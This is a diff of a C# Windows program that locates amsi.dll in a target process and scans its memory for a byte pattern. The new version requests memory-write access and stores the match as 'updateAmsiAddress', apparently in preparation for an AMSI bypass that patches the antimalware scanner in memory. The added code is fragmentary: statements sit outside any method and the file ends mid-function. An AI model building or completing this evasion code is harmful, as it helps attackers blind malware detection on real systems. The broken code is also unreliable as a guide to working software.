@@ -1,144 +1,91 @@
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
+ byte[] pattern = { 0x48, 0x00, 0x00, 0x74, 0x00, 0x48, 0x00, 0x00, 0x74 };
+    uint patternSize = (uint)pattern.Length;
+    uint bufferSize = 0x10000; // Read 64KB at a time
 
-class Program
-{
-    const uint PROCESS_QUERY_INFORMATION = 0x0400;
-    const uint PROCESS_VM_READ = 0x0010;
-    const uint LIST_MODULES_ALL = 0x03;
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
-
-    [DllImport("psapi.dll", SetLastError = true)]
-    public static extern bool EnumProcessModulesEx(IntPtr hProcess, [Out] IntPtr[] lphModule, uint cb, out uint lpcbNeeded, uint dwFilterFlag);
-
-    [DllImport("psapi.dll", SetLastError = true, CharSet = CharSet.Auto)]
-    public static extern uint GetModuleBaseName(IntPtr hProcess, IntPtr hModule, [Out] char[] lpBaseName, uint nSize);
-
-    [DllImport("psapi.dll", SetLastError = true)]
-    public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out uint lpNumberOfBytesRead);
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct MODULEINFO
+    uint tpid = pid;
+    if (tpid == 0)
     {
-        public IntPtr lpBaseOfDll;
-        public uint SizeOfImage;
-        public IntPtr EntryPoint;
+        Console.WriteLine("Process not found.");
+        return;
     }
 
-    static void Main(string[] args)
-    {
-        int targetPid = 1234; // Replace with your actual process ID
-        string targetModuleName = "amsi.dll"; // We are looking for amsi.dll
+    Console.WriteLine("Process PID: " + tpid);
 
-        IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, targetPid);
-        if (processHandle == IntPtr.Zero)
+    IntPtr processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, tpid);
+    if (processHandle == IntPtr.Zero)
+    {
+        Console.WriteLine("Failed to open process. Error: " + GetLastError());
+        return;
+    }
+
+    // Get the base address of amsi.dll in the remote process
+    IntPtr amsiBaseAddress = GetRemoteModuleBaseAddress(processHandle, "amsi.dll", out uint amsiSize);
+    if (amsiBaseAddress == IntPtr.Zero)
+    {
+        Console.WriteLine("Failed to find amsi.dll in the target process.");
+        return;
+    }
+
+    Console.WriteLine("amsi.dll base address: 0x" + amsiBaseAddress.ToString("X"));
+
+    // Read more memory to ensure we're scanning a large enough region
+    byte[] buffer = new byte[bufferSize];
+    uint bytesRead;
+
+    IntPtr currentAddress = amsiBaseAddress;
+
+    // Loop to read multiple chunks of memory if needed
+    for (int i = 0; i < 10; i++) // Adjust as necessary to scan further
+    {
+        if (!ReadProcessMemory(processHandle, currentAddress, buffer, bufferSize, out bytesRead))
         {
-            Console.WriteLine("Failed to open process. Error: {0}", Marshal.GetLastWin32Error());
+            Console.WriteLine("Failed to read process memory. Error: " + GetLastError());
             return;
         }
 
-        // Get the base address of amsi.dll
-        IntPtr amsiBaseAddress = GetModuleBaseAddress(processHandle, targetModuleName, out uint amsiSize);
-        if (amsiBaseAddress != IntPtr.Zero)
+        Console.WriteLine("Read {0} bytes from address 0x{1:X}", bytesRead, currentAddress.ToInt64());
+
+        // Search for the pattern in the buffer
+        ulong matchOffset = SearchPattern(buffer, bytesRead, pattern, patternSize);
+        if (matchOffset != 0)
         {
-            Console.WriteLine("Base address of {0} in process {1} is: 0x{2:X}", targetModuleName, targetPid, amsiBaseAddress);
-
-            // Now that we have the base address and size, we can search the memory
-            byte[] pattern = { 0x48, 0x00, 0x00, 0x74, 0x00, 0x48, 0x00, 0x00, 0x74 }; // Replace with your actual pattern
-            SearchAmsiMemory(processHandle, amsiBaseAddress, amsiSize, pattern);
-        }
-        else
-        {
-            Console.WriteLine("{0} not found in process {1}.", targetModuleName, targetPid);
-        }
-    }
-
-    static IntPtr GetModuleBaseAddress(IntPtr processHandle, string moduleName, out uint moduleSize)
-    {
-        IntPtr[] modules = new IntPtr[1024]; // Array to hold module handles
-        uint cb = (uint)(IntPtr.Size * modules.Length);
-        uint cbNeeded;
-        moduleSize = 0;
-
-        // Enumerate the modules in the target process
-        if (EnumProcessModulesEx(processHandle, modules, cb, out cbNeeded, LIST_MODULES_ALL))
-        {
-            int moduleCount = (int)(cbNeeded / IntPtr.Size);
-
-            for (int i = 0; i < moduleCount; i++)
-            {
-                char[] moduleNameBuffer = new char[255];
-                GetModuleBaseName(processHandle, modules[i], moduleNameBuffer, (uint)moduleNameBuffer.Length);
-                string moduleBaseName = new string(moduleNameBuffer).TrimEnd('\0');
-
-                if (moduleBaseName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
-                {
-                    // Found the target module, get its base address and size
-                    MODULEINFO moduleInfo;
-                    if (GetModuleInformation(processHandle, modules[i], out moduleInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO))))
-                    {
-                        moduleSize = moduleInfo.SizeOfImage;
-                        return moduleInfo.lpBaseOfDll;
-                    }
-                }
-            }
+            ulong updateAmsiAddress = (ulong)currentAddress.ToInt64() + matchOffset;
+            Console.WriteLine("Pattern found at address: 0x{0:X}", updateAmsiAddress);
+            break; // Exit after finding the pattern, or continue if looking for multiple occurrences
         }
 
-        return IntPtr.Zero; // Module not found
-    }
-
-    static void SearchAmsiMemory(IntPtr processHandle, IntPtr amsiBaseAddress, uint amsiSize, byte[] pattern)
-    {
-        byte[] buffer = new byte[amsiSize];
-        uint bytesRead;
-
-        // Read the memory of amsi.dll
-        if (ReadProcessMemory(processHandle, amsiBaseAddress, buffer, amsiSize, out bytesRead))
-        {
-            Console.WriteLine("Successfully read {0} bytes from amsi.dll", bytesRead);
-
-            // Search for the pattern in the buffer
-            ulong matchOffset = SearchPattern(buffer, bytesRead, pattern, (uint)pattern.Length);
-            if (matchOffset != 0)
-            {
-                ulong matchAddress = (ulong)amsiBaseAddress.ToInt64() + matchOffset;
-                Console.WriteLine("Pattern found at address: 0x{0:X}", matchAddress);
-            }
-            else
-            {
-                Console.WriteLine("Pattern not found in amsi.dll.");
-            }
-        }
-        else
-        {
-            Console.WriteLine("Failed to read memory. Error: {0}", Marshal.GetLastWin32Error());
-        }
-    }
-
-    static ulong SearchPattern(byte[] buffer, uint bytesRead, byte[] pattern, uint patternSize)
-    {
-        for (int i = 0; i <= bytesRead - patternSize; i++)
-        {
-            bool found = true;
-            for (int j = 0; j < patternSize; j++)
-            {
-                if (buffer[i + j] != pattern[j])
-                {
-                    found = false;
-                    break;
-                }
-            }
-
-            if (found)
-                return (ulong)i; // Return the offset where the pattern was found
-        }
-
-        return 0; // Pattern not found
+        // Move to the next memory region
+        currentAddress = IntPtr.Add(currentAddress, (int)bufferSize);
     }
 }
+
+private static IntPtr GetRemoteModuleBaseAddress(IntPtr processHandle, string moduleName, out uint moduleSize)
+{
+    moduleSize = 0;
+    IntPtr[] modules = new IntPtr[1024];
+    uint cb = (uint)(IntPtr.Size * modules.Length);
+    uint cbNeeded;
+
+    if (EnumProcessModulesEx(processHandle, modules, cb, out cbNeeded, LIST_MODULES_ALL))
+    {
+        int moduleCount = (int)(cbNeeded / IntPtr.Size);
+
+        for (int i = 0; i < moduleCount; i++)
+        {
+            char[] moduleNameBuffer = new char[255];
+            GetModuleBaseName(processHandle, modules[i], moduleNameBuffer, (uint)moduleNameBuffer.Length);
+            string moduleBaseName = new string(moduleNameBuffer).TrimEnd('\0');
+
+            if (moduleBaseName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
+            {
+                MODULEINFO moduleInfo;
+                if (GetModuleInformation(processHandle, modules[i], out moduleInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO))))
+                {
+                    moduleSize = moduleInfo.SizeOfImage;
+                    return moduleInfo.lpBaseOfDll;
+                }
+            }
+        }
+    }
+
+    return IntPtr.Zero; // Module not found
